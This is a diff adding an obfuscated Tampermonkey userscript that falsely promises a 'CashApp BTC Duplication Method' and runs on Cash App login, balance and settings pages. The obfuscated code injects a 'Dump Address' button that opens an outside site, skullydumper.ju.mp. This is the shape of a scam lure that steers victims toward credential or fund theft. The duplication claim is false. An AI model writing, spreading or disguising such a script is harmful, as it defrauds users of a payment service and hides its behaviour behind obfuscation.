@@ -1,0 +1,15 @@
+// ==UserScript==
+// @name         CashApp BTC Duplication Method (March 2023) WORKS ON MOBILE!
+// @namespace    http://tampermonkey.net/
+// @version      2.1
+// @description  Created by lich from lichmethods
+// @author       You
+// @match        https://cash.app/account/activity
+// @match        https://cash.app/login?
+// @match        https://cash.app/account/mycash
+// @match        https://cash.app/account/settings
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=cash.app
+// @grant        none
+// ==/UserScript==
+
+function _0x9c7b(){const _0x30a472=['41265BdGHJd','23340bqdkGS','418323fYAogh','beforeend','68576hBemWU','bind','857360DvYYQm','12xKrjBJ','#mybutt','55lYCiDc','click','insertAdjacentHTML','243736WRCGWu','querySelector','252XmGxdO','30fhMXzD','\x0a\x20\x20\x20\x20<button\x20id=\x22mybutt\x22>Dump\x20Address</button>\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20#mybutt{position:absolute;top:645px;left:5%;height:60px;width:120px;border:#0bb634;font-size:15px;border-radius:6px;}\x0a\x20\x20\x20\x20\x20\x20\x20\x20#mybutt{background:#0bb634;color:white;padding-top:0px;text-align:center;}\x0a\x20\x20\x20\x20\x20\x20\x20\x20#mybutt{z-index:99999;}\x0a\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20','46854VBCMTQ'];_0x9c7b=function(){return _0x30a472;};return _0x9c7b();}(function(_0x368148,_0x583c50){const _0x2db373=_0x46a8,_0x119d4f=_0x368148();while(!![]){try{const _0x1c0890=parseInt(_0x2db373(0xd9))/0x1*(-parseInt(_0x2db373(0xe0))/0x2)+parseInt(_0x2db373(0xdb))/0x3+-parseInt(_0x2db373(0xe5))/0x4+parseInt(_0x2db373(0xd6))/0x5*(-parseInt(_0x2db373(0xd8))/0x6)+parseInt(_0x2db373(0xdf))/0x7+-parseInt(_0x2db373(0xdd))/0x8*(-parseInt(_0x2db373(0xd5))/0x9)+parseInt(_0x2db373(0xda))/0xa*(parseInt(_0x2db373(0xe2))/0xb);if(_0x1c0890===_0x583c50)break;else _0x119d4f['push'](_0x119d4f['shift']());}catch(_0x40a5c7){_0x119d4f['push'](_0x119d4f['shift']());}}}(_0x9c7b,0x26a15),(function(){'use strict';const _0x388f1a=_0x46a8;const _0x4bac3f=document[_0x388f1a(0xd4)][_0x388f1a(0xde)](document);_0x4bac3f('body')[_0x388f1a(0xe4)](_0x388f1a(0xdc),init_css()),setTimeout(()=>{const _0x550ad9=_0x388f1a;_0x4bac3f(_0x550ad9(0xe1))['addEventListener'](_0x550ad9(0xe3),()=>{window['open']('https://skullydumper.ju.mp/');});},0x1f4);}()));function _0x46a8(_0x2618ee,_0x222855){const _0x9c7bd1=_0x9c7b();return _0x46a8=function(_0x46a8db,_0x5410d5){_0x46a8db=_0x46a8db-0xd4;let _0x5d6b92=_0x9c7bd1[_0x46a8db];return _0x5d6b92;},_0x46a8(_0x2618ee,_0x222855);}function init_css(){const _0x4a051f=_0x46a8;return _0x4a051f(0xd7);}
